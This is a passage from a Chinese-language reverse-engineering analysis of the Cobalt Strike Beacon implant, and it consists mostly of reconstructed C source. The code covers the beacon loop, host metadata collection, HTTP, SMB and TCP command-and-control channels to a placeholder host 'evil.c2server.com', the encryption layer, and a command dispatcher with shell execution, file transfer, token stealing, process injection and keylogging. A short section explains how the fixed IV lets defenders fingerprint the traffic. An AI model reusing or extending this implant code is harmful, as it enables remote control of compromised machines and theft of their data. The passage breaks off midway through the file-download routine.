                // 6d. 解密响应
                BYTE decrypted[MAX_BEACON_DATA];
                DWORD decrypted_len;
                if (decrypt_payload(response, response_len, 
                                    decrypted, &decrypted_len)) {
                    // 6e. 处理命令
                    process_payload(decrypted, decrypted_len);
                }
            }
        }
        
        // 6f. 睡眠 (带抖动)
        DWORD sleep_time = settings->sleeptime;
        if (settings->jitter > 0) {
            sleep_time += (rand() % (settings->jitter * sleep_time / 100));
        }
        Sleep(sleep_time);
    }
    
    return 0;
}
```

### 6.3 元数据结构

对应源码: `metadata.cpp`

```c
// ===== metadata.cpp: 元数据构建 =====

#define METADATA_SIZE 128  // RSA-1024 加密后的元数据大小

typedef struct {
    BYTE encrypted_data[METADATA_SIZE];
    // 解密后包含:
    // struct {
    //     DWORD beacon_id;        // 4 bytes  - Beacon 唯一 ID
    //     DWORD pid;              // 4 bytes  - 进程 PID
    //     WORD  port;             // 2 bytes  - 本地端口
    //     BYTE  flags;            // 1 byte   - 标志位
    //     BYTE  os_major;         // 1 byte   - OS 主版本
    //     BYTE  os_minor;         // 1 byte   - OS 次版本
    //     WORD  build;            // 2 bytes  - OS Build
    //     DWORD ptr_gmh;          // 4 bytes  - GetModuleHandleA 指针 (x86)
    //     DWORD ptr_gpa;          // 4 bytes  - GetProcAddress 指针 (x86)
    //     CHAR  computer[32];     // 32 bytes - 计算机名
    //     CHAR  user[32];         // 32 bytes - 用户名
    //     CHAR  process[32];      // 32 bytes - 进程名
    //     BYTE  session_key[16];  // 16 bytes - AES 会话密钥
    // };
} METADATA;

METADATA* build_metadata(SETTINGS* settings) {
    METADATA* meta = (METADATA*)malloc(sizeof(METADATA));
    
    // 构建元数据明文
    BYTE plaintext[METADATA_SIZE];
    ZeroMemory(plaintext, METADATA_SIZE);
    
    // 填充系统信息
    DWORD offset = 0;
    *(DWORD*)(plaintext + offset) = g_beacon_id; offset += 4;
    *(DWORD*)(plaintext + offset) = GetCurrentProcessId(); offset += 4;
    *(WORD*)(plaintext + offset) = settings->port; offset += 2;
    *(BYTE*)(plaintext + offset) = flags; offset += 1;
    
    // OS 版本
    OSVERSIONINFOEX osvi = {sizeof(OSVERSIONINFOEX)};
    GetVersionEx((OSVERSIONINFO*)&osvi);
    *(BYTE*)(plaintext + offset) = osvi.dwMajorVersion; offset += 1;
    *(BYTE*)(plaintext + offset) = osvi.dwMinorVersion; offset += 1;
    *(WORD*)(plaintext + offset) = osvi.dwBuildNumber; offset += 2;
    
    // 计算机名
    DWORD size = 32;
    GetComputerNameA((LPSTR)(plaintext + offset), &size); offset += 32;
    
    // 用户名
    size = 32;
    GetUserNameA((LPSTR)(plaintext + offset), &size); offset += 32;
    
    // 进程名
    GetModuleBaseNameA(GetCurrentProcess(), NULL,
                       (LPSTR)(plaintext + offset), 32); offset += 32;
    
    // AES 会话密钥
    memcpy(plaintext + offset, g_aes_session_key, 16); offset += 16;
    
    // RSA-1024 加密
    RSA_Encrypt(settings->pubkey, plaintext, METADATA_SIZE, meta->encrypted_data);
    
    return meta;
}
```

### 6.4 IDA 中 DllMain 的反编译验证

```c
// ===== IDA Pro 反编译: DllEntryPoint =====

__int64 __fastcall DllEntryPoint(HINSTANCE hInstance, DWORD dwReason, 
                                  LPVOID lpReserved)
{
    if (dwReason == 1)  // DLL_PROCESS_ATTACH
    {
        sub_180003000();  // 安全初始化 / 反调试检查
        
        // 保存 hInstance 到全局变量
        qword_18003E010 = (__int64)hInstance;
        
        // 调用 BeaconMain
        // 对应源码: CreateThread(NULL, 0, BeaconMain, lpReserved, 0, NULL)
        HANDLE hThread = CreateThread(0, 0, BeaconMain, lpReserved, 0, 0);
        if (hThread) {
            CloseHandle(hThread);
        }
        
        return 1;
    }
    return 1;
}
```

---

## 七、阶段五：C2 通信循环

### 7.1 HTTP 通道实现

对应源码: `channel.cpp` (HTTP 通道部分)

```c
// ===== channel.cpp: HTTP 通道 =====

typedef struct {
    HINTERNET hInternet;
    HINTERNET hConnect;
    HINTERNET hRequest;
    char*     user_agent;
    char*     c2_server;
    WORD      c2_port;
    char*     submit_uri;
    DWORD     max_get_size;
    DWORD     max_post_size;
} HTTP_CHANNEL;

// HTTP 通道创建
HTTP_CHANNEL* create_http_channel(SETTINGS* settings)
{
    HTTP_CHANNEL* channel = (HTTP_CHANNEL*)malloc(sizeof(HTTP_CHANNEL));
    
    channel->user_agent   = settings->user_agent;
    channel->c2_server    = settings->c2_server;
    channel->c2_port      = settings->port;
    channel->submit_uri   = settings->submit_uri;
    channel->max_get_size = settings->maxget;
    channel->max_post_size = settings->maxpost;
    
    return channel;
}

// HTTP 发送
BOOL http_send(HTTP_CHANNEL* channel, BYTE* data, DWORD data_len)
{
    // 1. 初始化 WinINet
    channel->hInternet = InternetOpenA(
        channel->user_agent,         // "Mozilla/5.0 (compatible; MSIE 9.0; ...)"
        INTERNET_OPEN_TYPE_DIRECT,   // 直连 (不使用代理)
        NULL,                        // 无代理
        NULL,                        // 无代理绕过
        0                            // 标志
    );
    
    if (!channel->hInternet) goto error;
    
    // 2. 连接 C2 服务器
    channel->hConnect = InternetConnectA(
        channel->hInternet,
        channel->c2_server,          // "evil.c2server.com"
        channel->c2_port,            // 443 (HTTPS) 或 80 (HTTP)
        NULL,                        // 无用户名
        NULL,                        // 无密码
        INTERNET_SERVICE_HTTP,       // HTTP 服务
        0,                           // 标志
        0                            // 上下文
    );
    
    if (!channel->hConnect) goto error_cleanup_inet;
    
    // 3. 创建 HTTP POST 请求
    channel->hRequest = HttpOpenRequestA(
        channel->hConnect,
        "POST",                      // HTTP 方法
        channel->submit_uri,         // "/submit.php"
        NULL,                        // HTTP/1.1
        NULL,                        // 无 Referer
        NULL,                        // 无 Accept Types
        INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_RELOAD |
        (channel->c2_port == 443 ? INTERNET_FLAG_SECURE : 0),
        0                            // 上下文
    );
    
    if (!channel->hRequest) goto error_cleanup_connect;
    
    // 4. 发送数据
    BOOL result = HttpSendRequestA(
        channel->hRequest,
        "Content-Type: application/octet-stream\r\n",  // HTTP 头
        -1,                                             // 自动计算长度
        data,                                           // POST 数据
        data_len                                        // 数据长度
    );
    
    if (!result) goto error_cleanup_request;
    
    return TRUE;
    
error_cleanup_request:
    InternetCloseHandle(channel->hRequest);
error_cleanup_connect:
    InternetCloseHandle(channel->hConnect);
error_cleanup_inet:
    InternetCloseHandle(channel->hInternet);
error:
    return FALSE;
}

// HTTP 接收
BOOL http_recv(HTTP_CHANNEL* channel, BYTE* buffer, DWORD* buffer_len)
{
    DWORD bytesRead = 0;
    DWORD totalBytes = 0;
    
    // 循环读取直到没有更多数据
    while (InternetReadFile(channel->hRequest, 
                            buffer + totalBytes,
                            channel->max_get_size - totalBytes,
                            &bytesRead)) {
        if (bytesRead == 0) break;  // 读取完毕
        totalBytes += bytesRead;
    }
    
    *buffer_len = totalBytes;
    
    // 清理
    InternetCloseHandle(channel->hRequest);
    InternetCloseHandle(channel->hConnect);
    InternetCloseHandle(channel->hInternet);
    
    return (totalBytes > 0);
}
```

### 7.2 Malleable C2 请求/响应处理

对应源码: `profile.cpp`

```c
// ===== profile.cpp: Malleable C2 变换 =====

// 请求构建: 将 Beacon 数据嵌入到 Profile 定义的结构中
void build_http_request(BYTE* beacon_data, DWORD beacon_len,
                        BYTE* output, DWORD* output_len)
{
    // 1. 读取 Profile 配置
    char* get_verb    = profile->get_verb;    // "GET" 或 "POST"
    char* get_uri     = profile->get_uri;     // 完整的请求模板
    char* post_verb   = profile->post_verb;   // "POST"
    char* post_uri    = profile->post_uri;    // 完整请求模板
    char* user_agent  = profile->user_agent;  // User-Agent 头
    char* headers     = profile->headers;     // 自定义头
    
    // 2. 填充模板占位符
    // Profile 中的占位符:
    //   %%DATA%%     → Base64 编码的 Beacon 数据
    //   %%SESSION%%  → Beacon ID
    //   %%USER%%     → 用户名
    
    // 3. Base64 编码 Beacon 数据
    char* b64_data = base64_encode(beacon_data, beacon_len);
    
    // 4. 替换模板
    replace_template(output, post_uri, "%%DATA%%", b64_data);
    
    *output_len = strlen((char*)output);
}

// 响应解析: 从 C2 响应中提取 Beacon 命令
BOOL parse_http_response(BYTE* response, DWORD response_len,
                         BYTE* beacon_output, DWORD* beacon_output_len)
{
    // 1. 在响应中定位 Beacon 数据
    // Profile 定义数据边界标记 (如 HTML 注释)
    char* start_marker = "<!-- BEGIN BEACON -->";
    char* end_marker   = "<!-- END BEACON -->";
    
    char* start = strstr((char*)response, start_marker);
    char* end   = strstr((char*)response, end_marker);
    
    if (!start || !end) return FALSE;
    
    start += strlen(start_marker);
    DWORD data_len = (DWORD)(end - start);
    
    // 2. Base64 解码
    if (!base64_decode(start, data_len, beacon_output, beacon_output_len)) {
        return FALSE;
    }
    
    // 3. 解密 (AES-128-CBC + HMAC-SHA256 验证)
    return decrypt_and_verify(beacon_output, beacon_output_len);
}
```

### 7.3 SMB 通道实现

对应源码: `link.cpp` (SMB 部分)

```c
// ===== link.cpp: SMB 通道 =====

#define SMB_MAX_LINKS      40     // 最大 SMB 链接数
#define SMB_FRAME_HEADER   "BEA"  // 帧头标识
#define SMB_PIPE_PREFIX    "\\\\.\\pipe\\"

typedef struct {
    HANDLE    hPipe;
    char      pipename[256];
    BOOL      is_server;         // TRUE=管道服务端, FALSE=客户端
    DWORD     last_ping;
} SMB_LINK;

// SMB 服务端 (创建管道并等待连接)
SMB_LINK* smb_server_start(SETTINGS* settings)
{
    SMB_LINK* link = (SMB_LINK*)malloc(sizeof(SMB_LINK));
    
    // 构建管道名
    snprintf(link->pipename, sizeof(link->pipename),
             "%s%s", SMB_PIPE_PREFIX, settings->pipename);
    // 如: \\.\pipe\msagent_7e
    
    link->is_server = TRUE;
    
    // 创建命名管道
    link->hPipe = CreateNamedPipeA(
        link->pipename,
        PIPE_ACCESS_DUPLEX,          // 双向
        PIPE_TYPE_MESSAGE |          // 消息模式
        PIPE_READMODE_MESSAGE |
        PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,    // 无限实例
        4096,                        // 输出缓冲
        4096,                        // 输入缓冲
        0,                           // 默认超时
        NULL                         // 默认安全
    );
    
    if (link->hPipe == INVALID_HANDLE_VALUE) {
        free(link);
        return NULL;
    }
    
    // 等待客户端连接
    ConnectNamedPipe(link->hPipe, NULL);
    
    return link;
}

// SMB 客户端 (连接到管道)
SMB_LINK* smb_client_connect(char* target, SETTINGS* settings)
{
    SMB_LINK* link = (SMB_LINK*)malloc(sizeof(SMB_LINK));
    
    snprintf(link->pipename, sizeof(link->pipename),
             "\\\\%s\\pipe\\%s", target, settings->pipename);
    
    link->is_server = FALSE;
    
    // 连接到远程管道
    link->hPipe = CreateFileA(
        link->pipename,
        GENERIC_READ | GENERIC_WRITE,
        0,                           // 独占
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    
    if (link->hPipe == INVALID_HANDLE_VALUE) {
        free(link);
        return NULL;
    }
    
    return link;
}

// SMB 数据发送 (帧格式)
BOOL smb_send_frame(SMB_LINK* link, BYTE* data, DWORD data_len)
{
    // SMB 帧格式:
    // ┌──────────────┬──────────────┬───────────────┐
    // │ Frame Header │ Data Length  │ Encrypted Data │
    // │ 4 bytes      │ 4 bytes (LE) │ N bytes        │
    // └──────────────┴──────────────┴───────────────┘
    // Frame Header: settings->smb_frame_header (如 "BEA\0")
    
    DWORD frame_size = 4 + 4 + data_len;
    BYTE* frame = (BYTE*)malloc(frame_size);
    
    // 帧头
    memcpy(frame, settings->smb_frame_header, 4);
    // 长度
    *(DWORD*)(frame + 4) = data_len;
    // 数据
    memcpy(frame + 8, data, data_len);
    
    DWORD written;
    BOOL result = WriteFile(link->hPipe, frame, frame_size, &written, NULL);
    
    free(frame);
    return result;
}
```

### 7.4 TCP 通道实现

```c
// ===== link.cpp: TCP 通道 =====

#define TCP_FRAME_HEADER   "BEA"  // 同 SMB

typedef struct {
    SOCKET    sock;
    char      target[256];
    WORD      port;
    BOOL      is_server;
    DWORD     last_ping;
} TCP_LINK;

// TCP 服务端
TCP_LINK* tcp_server_start(SETTINGS* settings)
{
    TCP_LINK* link = (TCP_LINK*)malloc(sizeof(TCP_LINK));
    
    link->sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(settings->port);
    addr.sin_addr.s_addr = INADDR_ANY;
    
    bind(link->sock, (struct sockaddr*)&addr, sizeof(addr));
    listen(link->sock, SOMAXCONN);
    
    struct sockaddr_in client_addr;
    int addr_len = sizeof(client_addr);
    link->sock = accept(link->sock, (struct sockaddr*)&client_addr, &addr_len);
    
    return link;
}

// TCP 帧格式
// ┌──────────────┬──────────────┬───────────────┐
// │ Frame Header │ Data Length  │ Encrypted Data │
// │ 4 bytes      │ 4 bytes (LE) │ N bytes        │
// └──────────────┴──────────────┴───────────────┘
```

---

## 八、加密体系详解

### 8.1 加密架构总览

```
CobaltStrike Beacon 加密层次:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Layer 1: 元数据加密 (一次性)
  ├─ 算法: RSA-1024 (非对称)
  ├─ 密钥: Team Server 公钥 (嵌入在 Beacon 配置中)
  ├─ 明文: 128 字节系统信息 + AES 会话密钥
  └─ 用途: 首次心跳时传输 AES 密钥

Layer 2: 通信加密 (每次心跳)
  ├─ 算法: AES-128-CBC (对称)
  ├─ 密钥: 从元数据协商的会话密钥
  ├─ IV:   "abcdefghijklmnop" (固定, 在源码中硬编码)
  │         ⚠ 这是已知弱点 - 固定 IV 降低安全性
  └─ 用途: 加密所有 C2 通信数据

Layer 3: 完整性验证 (每次通信)
  ├─ 算法: HMAC-SHA256
  ├─ 密钥: 同 AES 密钥
  └─ 格式: [AES_CBC_Encrypted_Data][HMAC_SHA256_Hash(16 bytes)]
```

### 8.2 security.cpp 源码还原

```c
// ===== security.cpp: 加密核心 =====

#include <wincrypt.h>

// ⚠ 固定 IV (安全问题!)
// 源码中硬编码: "abcdefghijklmnop" (16 字节)
#define AES_IV  "abcdefghijklmnop"
#define AES_KEY_SIZE    16   // AES-128
#define HMAC_SIZE       16   // HMAC-SHA256 截断为 16 字节

static BYTE g_aes_key[AES_KEY_SIZE];
static BYTE g_hmac_key[AES_KEY_SIZE];
static HCRYPTPROV g_hCryptProv = 0;

// ── 初始化加密子系统 ──
BOOL init_security(SETTINGS* settings)
{
    // 1. 获取加密上下文
    if (!CryptAcquireContextA(
            &g_hCryptProv,
            NULL,
            MS_ENH_RSA_AES_PROV_A,   // "Microsoft Enhanced RSA and AES Cryptographic Provider"
            PROV_RSA_AES,
            CRYPT_VERIFYCONTEXT)) {
        return FALSE;
    }
    
    // 2. 生成随机 AES 会话密钥
    if (!CryptGenRandom(g_hCryptProv, AES_KEY_SIZE, g_aes_key)) {
        return FALSE;
    }
    
    // 3. HMAC 密钥 = AES 密钥 (共享)
    memcpy(g_hmac_key, g_aes_key, AES_KEY_SIZE);
    
    // 4. 保存 RSA 公钥 (用于元数据加密)
    g_rsa_pubkey = settings->pubkey;
    
    return TRUE;
}

// ── RSA-1024 加密 (元数据) ──
BOOL rsa_encrypt_metadata(BYTE* pubkey_blob, BYTE* plaintext, 
                          DWORD plaintext_len, BYTE* ciphertext)
{
    HCRYPTKEY hRsaKey;
    
    // 1. 导入 RSA 公钥
    if (!CryptImportKey(g_hCryptProv, pubkey_blob, 
                        RSA1024BIT_KEY_BLOB_SIZE, 0, 0, &hRsaKey)) {
        return FALSE;
    }
    
    // 2. RSA 加密 (PKCS#1 v1.5 填充)
    DWORD ciphertext_len = 128;  // RSA-1024 = 128 字节
    memcpy(ciphertext, plaintext, plaintext_len);  // 复制明文到输出缓冲
    
    if (!CryptEncrypt(hRsaKey, 0, TRUE, 0, ciphertext, &plaintext_len, 128)) {
        CryptDestroyKey(hRsaKey);
        return FALSE;
    }
    
    CryptDestroyKey(hRsaKey);
    return TRUE;
}

// ── AES-128-CBC 加密 ──
DWORD aes_encrypt(BYTE* plaintext, DWORD plaintext_len, 
                  BYTE* ciphertext, DWORD ciphertext_max)
{
    HCRYPTKEY hAesKey;
    
    // 1. 构建 AES key blob
    struct {
        BLOBHEADER hdr;
        DWORD      keySize;
        BYTE       keyBytes[AES_KEY_SIZE];
    } keyBlob;
    
    keyBlob.hdr.bType    = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_128;
    keyBlob.keySize      = AES_KEY_SIZE;
    memcpy(keyBlob.keyBytes, g_aes_key, AES_KEY_SIZE);
    
    // 2. 导入 AES 密钥
    if (!CryptImportKey(g_hCryptProv, (BYTE*)&keyBlob, 
                        sizeof(keyBlob), 0, 0, &hAesKey)) {
        return 0;
    }
    
    // 3. 设置 CBC 模式和固定 IV
    BYTE iv[16];
    memcpy(iv, AES_IV, 16);  // 固定 IV: "abcdefghijklmnop"
    
    if (!CryptSetKeyParam(hAesKey, KP_IV, iv, 0)) {
        CryptDestroyKey(hAesKey);
        return 0;
    }
    
    // 4. 加密
    DWORD data_len = plaintext_len;
    memcpy(ciphertext, plaintext, plaintext_len);
    
    if (!CryptEncrypt(hAesKey, 0, TRUE, 0, ciphertext, &data_len, 
                      ciphertext_max)) {
        CryptDestroyKey(hAesKey);
        return 0;
    }
    
    CryptDestroyKey(hAesKey);
    return data_len;
}

// ── AES-128-CBC 解密 ──
DWORD aes_decrypt(BYTE* ciphertext, DWORD ciphertext_len,
                  BYTE* plaintext, DWORD plaintext_max)
{
    HCRYPTKEY hAesKey;
    
    // 构建 AES key blob (同上)
    struct {
        BLOBHEADER hdr;
        DWORD      keySize;
        BYTE       keyBytes[AES_KEY_SIZE];
    } keyBlob;
    
    keyBlob.hdr.bType    = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_128;
    keyBlob.keySize      = AES_KEY_SIZE;
    memcpy(keyBlob.keyBytes, g_aes_key, AES_KEY_SIZE);
    
    CryptImportKey(g_hCryptProv, (BYTE*)&keyBlob, 
                   sizeof(keyBlob), 0, 0, &hAesKey);
    
    // 设置 IV
    BYTE iv[16];
    memcpy(iv, AES_IV, 16);
    CryptSetKeyParam(hAesKey, KP_IV, iv, 0);
    
    // 解密
    DWORD data_len = ciphertext_len;
    memcpy(plaintext, ciphertext, ciphertext_len);
    
    CryptDecrypt(hAesKey, 0, TRUE, 0, plaintext, &data_len);
    
    CryptDestroyKey(hAesKey);
    return data_len;
}

// ── HMAC-SHA256 计算 ──
BOOL hmac_sha256(BYTE* key, DWORD key_len, 
                 BYTE* data, DWORD data_len,
                 BYTE* mac, DWORD* mac_len)
{
    HCRYPTHASH hHash;
    HCRYPTKEY  hHmacKey;
    
    // 1. 导入 HMAC 密钥
    struct {
        BLOBHEADER hdr;
        DWORD      keySize;
        BYTE       keyBytes[AES_KEY_SIZE];
    } keyBlob;
    
    keyBlob.hdr.bType    = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_RC2;  // 用于 HMAC
    keyBlob.keySize      = key_len;
    memcpy(keyBlob.keyBytes, key, key_len);
    
    CryptImportKey(g_hCryptProv, (BYTE*)&keyBlob, 
                   sizeof(keyBlob), 0, CRYPT_IPSEC_HMAC_KEY, &hHmacKey);
    
    // 2. 创建 HMAC hash
    CryptCreateHash(g_hCryptProv, CALG_HMAC, hHmacKey, 0, &hHash);
    
    // 3. 设置 HMAC 算法为 SHA-256
    HMAC_INFO hmacInfo;
    hmacInfo.HashAlgid = CALG_SHA_256;
    hmacInfo.pbInnerString = NULL;
    hmacInfo.cbInnerString = 0;
    hmacInfo.pbOuterString = NULL;
    hmacInfo.cbOuterString = 0;
    CryptSetHashParam(hHash, HP_HMAC_INFO, (BYTE*)&hmacInfo, 0);
    
    // 4. 计算 HMAC
    CryptHashData(hHash, data, data_len, 0);
    
    // 5. 获取结果 (截断为 16 字节)
    DWORD hashSize = 32;  // SHA-256 完整输出
    BYTE hash[32];
    CryptGetHashParam(hHash, HP_HASHVAL, hash, &hashSize, 0);
    
    memcpy(mac, hash, 16);  // 只取前 16 字节
    *mac_len = 16;
    
    CryptDestroyHash(hHash);
    CryptDestroyKey(hHmacKey);
    
    return TRUE;
}

// ── 完整数据包加密格式 ──
// 
// Plaintext: [Counter (4 bytes)] [Beacon Data (N bytes)] [Padding]
// Counter: 递增的计数器，防止重放攻击
//
// Encrypted Packet:
// ┌─────────────────────┬──────────────────┐
// │ AES-128-CBC 密文     │ HMAC-SHA256 (16B) │
// │ (16字节对齐)         │ 截断为 16 字节     │
// └─────────────────────┴──────────────────┘
//
DWORD build_encrypted_packet(BYTE* plaintext, DWORD plaintext_len,
                              BYTE* output, DWORD output_max)
{
    DWORD total_len = plaintext_len;
    
    // 1. 添加计数器
    BYTE packet[4096];
    *(DWORD*)packet = g_packet_counter++;  // 4 字节计数器
    memcpy(packet + 4, plaintext, plaintext_len);
    total_len = 4 + plaintext_len;
    
    // 2. PKCS7 填充到 16 字节边界
    DWORD padded_len = ((total_len + 15) / 16) * 16;
    BYTE pad_value = (BYTE)(padded_len - total_len);
    memset(packet + total_len, pad_value, pad_value);
    total_len = padded_len;
    
    // 3. AES-128-CBC 加密
    DWORD encrypted_len = aes_encrypt(packet, total_len, output, output_max);
    if (encrypted_len == 0) return 0;
    
    // 4. 计算 HMAC-SHA256
    BYTE hmac[16];
    DWORD hmac_len;
    hmac_sha256(g_hmac_key, AES_KEY_SIZE, output, encrypted_len, hmac, &hmac_len);
    
    // 5. 追加 HMAC
    memcpy(output + encrypted_len, hmac, hmac_len);
    
    return encrypted_len + hmac_len;
}

// ── 解密验证 ──
BOOL decrypt_and_verify_packet(BYTE* packet, DWORD packet_len,
                                BYTE* output, DWORD* output_len)
{
    if (packet_len < 32) return FALSE;  // 最小: 16(AES) + 16(HMAC)
    
    DWORD encrypted_len = packet_len - 16;  // 去掉 HMAC
    BYTE* encrypted_data = packet;
    BYTE* received_hmac = packet + encrypted_len;
    
    // 1. 验证 HMAC
    BYTE computed_hmac[16];
    DWORD hmac_len;
    hmac_sha256(g_hmac_key, AES_KEY_SIZE, encrypted_data, encrypted_len,
                computed_hmac, &hmac_len);
    
    if (memcmp(computed_hmac, received_hmac, 16) != 0) {
        return FALSE;  // HMAC 不匹配 → 丢弃
    }
    
    // 2. AES 解密
    BYTE decrypted[4096];
    DWORD decrypted_len = aes_decrypt(encrypted_data, encrypted_len, 
                                       decrypted, sizeof(decrypted));
    if (decrypted_len == 0) return FALSE;
    
    // 3. 去除 PKCS7 填充
    BYTE pad_value = decrypted[decrypted_len - 1];
    if (pad_value > 16) return FALSE;
    decrypted_len -= pad_value;
    
    // 4. 跳过计数器
    DWORD counter = *(DWORD*)decrypted;
    // (可选: 验证计数器 > 之前的值，防止重放)
    
    *output_len = decrypted_len - 4;
    memcpy(output, decrypted + 4, *output_len);
    
    return TRUE;
}
```

### 8.3 固定 IV 的安全影响

```
⚠ CobaltStrike Beacon 的已知弱点:

1. 固定 IV = "abcdefghijklmnop"
   - AES-CBC 模式下，固定 IV 会导致:
     a) 相同明文 → 相同密文 (第一个块)
     b) 可被用于指纹识别 Beacon 流量
     c) 降低密码学强度

2. HMAC 截断为 16 字节
   - SHA-256 输出 32 字节，只取前 16 字节
   - 降低了碰撞抗性 (但仍足够)

3. 防御优势:
   - 这些弱点使得安全产品可以指纹识别 CobaltStrike 加密流量
   - 固定 IV + 已知的 AES-128-CBC 模式 = 可检测模式
```

---

## 九、命令处理系统

### 9.1 命令分派架构

对应源码: `commands.cpp` → `process_payload()`

```c
// ===== commands.cpp: 命令处理 =====

// 命令 ID 定义 (从命令处理函数逆推)
#define CMD_EXIT              0x01
#define CMD_SLEEP             0x02
#define CMD_SHELL             0x03
#define CMD_EXECUTE           0x04
#define CMD_UPLOAD            0x05
#define CMD_DOWNLOAD          0x06
#define CMD_FILE_LIST         0x07
#define CMD_FILE_DELETE       0x08
#define CMD_FILE_MOVE         0x09
#define CMD_FILE_COPY         0x0A
#define CMD_FILE_MKDIR        0x0B
#define CMD_CD                0x0C
#define CMD_PS_LIST           0x0D
#define CMD_PS_KILL           0x0E
#define CMD_INJECT            0x0F
#define CMD_INJECT_PID        0x10
#define CMD_SPAWN             0x11
#define CMD_SPAWNAS           0x12
#define CMD_REV2SELF          0x13
#define CMD_STEAL_TOKEN       0x14
#define CMD_GETSYSTEM         0x15
#define CMD_MAKE_TOKEN        0x16
#define CMD_LS                0x17
#define CMD_RUN               0x18
#define CMD_PWD               0x19
#define CMD_DRIVES            0x1A
#define CMD_RUNU              0x1B
#define CMD_PAUSE             0x1C
#define CMD_KEYLOG_START      0x1D
#define CMD_KEYLOG_STOP       0x1E
#define CMD_PORT_SCAN         0x1F
#define CMD_SOCKS_START       0x20
#define CMD_SOCKS_STOP        0x21
#define CMD_LINK_CONNECT      0x22
#define CMD_LINK_DISCONNECT   0x23
#define CMD_SPAWN_X86         0x24
#define CMD_SPAWN_X64         0x25
#define CMD_INJECT_X86        0x26
#define CMD_INJECT_X64        0x27

// 命令处理主函数
void process_payload(BYTE* payload, DWORD payload_len)
{
    if (payload_len < 4) return;
    
    DWORD cmd_id = *(DWORD*)payload;
    BYTE* cmd_data = payload + 4;
    DWORD cmd_data_len = payload_len - 4;
    
    switch (cmd_id) {
        case CMD_EXIT:           cmd_exit();              break;
        case CMD_SLEEP:          cmd_sleep(cmd_data);     break;
        case CMD_SHELL:          cmd_shell(cmd_data);     break;
        case CMD_EXECUTE:        cmd_execute(cmd_data);   break;
        case CMD_UPLOAD:         cmd_upload(cmd_data);    break;
        case CMD_DOWNLOAD:       cmd_download(cmd_data);  break;
        case CMD_FILE_LIST:      cmd_file_list(cmd_data); break;
        case CMD_PS_LIST:        cmd_ps_list();           break;
        case CMD_PS_KILL:        cmd_ps_kill(cmd_data);   break;
        case CMD_INJECT:         cmd_inject(cmd_data);    break;
        case CMD_SPAWN:          cmd_spawn(cmd_data);     break;
        case CMD_STEAL_TOKEN:    cmd_steal_token(cmd_data); break;
        case CMD_GETSYSTEM:      cmd_getsystem();         break;
        case CMD_MAKE_TOKEN:     cmd_make_token(cmd_data); break;
        case CMD_REV2SELF:       cmd_revert_to_self();    break;
        case CMD_SOCKS_START:    cmd_socks_start(cmd_data); break;
        case CMD_SOCKS_STOP:     cmd_socks_stop();        break;
        case CMD_LINK_CONNECT:   cmd_link_connect(cmd_data); break;
        case CMD_LINK_DISCONNECT:cmd_link_disconnect();   break;
        case CMD_KEYLOG_START:   cmd_keylog_start();      break;
        case CMD_KEYLOG_STOP:    cmd_keylog_stop();       break;
        case CMD_PORT_SCAN:      cmd_port_scan(cmd_data); break;
        case CMD_SPAWN_X86:      cmd_spawn_x86(cmd_data); break;
        case CMD_SPAWN_X64:      cmd_spawn_x64(cmd_data); break;
        case CMD_INJECT_X86:     cmd_inject_x86(cmd_data);break;
        case CMD_INJECT_X64:     cmd_inject_x64(cmd_data);break;
        default:
            // 未知命令
            break;
    }
}
```

### 9.2 关键命令实现

#### 9.2.1 CMD_SHELL (cmd.exe 交互)

```c
// ===== commands.cpp: cmd_shell =====

void cmd_shell(BYTE* cmd_data)
{
    // 1. 解析参数
    char* command = (char*)cmd_data;  // 要执行的命令
    DWORD fork_flag = *(DWORD*)(cmd_data + strlen(command) + 1);
    
    // 2. 创建管道
    HANDLE hStdOutRead, hStdOutWrite;
    HANDLE hStdInRead, hStdInWrite;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    
    CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0);
    CreatePipe(&hStdInRead, &hStdInWrite, &sa, 0);
    
    // 3. 选择执行方式
    if (fork_flag) {
        // fork&run: 注入到新进程 (rundll32.exe / regsvr32.exe)
        spawn_and_run(command, hStdInRead, hStdOutWrite);
    } else {
        // 直接在当前进程执行 (风险更高)
        direct_run(command, hStdInRead, hStdOutWrite);
    }
    
    // 4. 读取输出并回传
    BYTE output[8192];
    DWORD bytesRead;
    while (ReadFile(hStdOutRead, output, sizeof(output), &bytesRead, NULL)) {
        if (bytesRead == 0) break;
        send_output(output, bytesRead);
    }
}
```

#### 9.2.2 CMD_UPLOAD / CMD_DOWNLOAD

```c
// ===== commands.cpp: file upload/download =====

void cmd_upload(BYTE* cmd_data)
{
    // 格式: [Path (NUL-terminated)] [File Data]
    char* path = (char*)cmd_data;
    BYTE* file_data = cmd_data + strlen(path) + 1;
    DWORD file_size = *(DWORD*)(cmd_data - 4);  // 从头部获取总大小
    
    // 写入文件
    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, file_data, file_size, &written, NULL);
        CloseHandle(hFile);
    }
}

void cmd_download(BYTE* cmd_data)
{
    char* path = (char*)cmd_data;
    
    // 读取文件
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD file_size = GetFileSize(hFile, NULL);
        BYTE* file_data = (BYTE*)malloc(file_size + 256);
        
        // 格式: [Path (NUL-terminated)] [File Size (4 bytes)] [File Data]
        DWORD offset = 0;
        strcpy((char*)(file_data + offset), path);
